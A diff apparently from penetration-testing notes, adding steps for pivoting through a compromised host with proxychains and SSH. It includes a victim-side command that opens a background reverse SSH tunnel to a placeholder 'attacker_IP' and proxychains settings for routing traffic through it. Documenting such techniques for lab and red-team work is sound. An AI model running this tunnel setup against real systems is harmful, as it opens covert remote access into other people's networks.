@@ -1,7 +1,18 @@
+Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.
+
+Note: For RDP, make sure xclip is installed.
+
+On Attacker Box
+Open /etc/proxychains4.conf.
+
+!!! SKIP NEXT STEP IF YOU CONFIGURED PROXY CHAINS ALREADY !!!
 (ATTACKER) sudo nano /etc/proxychains4.conf
 
-(ATTACKER) netstat -napt
+(ATTACKER) netstat -napt (set up listener over ssh)
 
 (ATTACKER) sudo systemctl status ssh.service
 
+(ATTACKER) sudo systemctl start ssh.service (check if started)
+
 (VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port *
+(refrence wiki for screenshots)
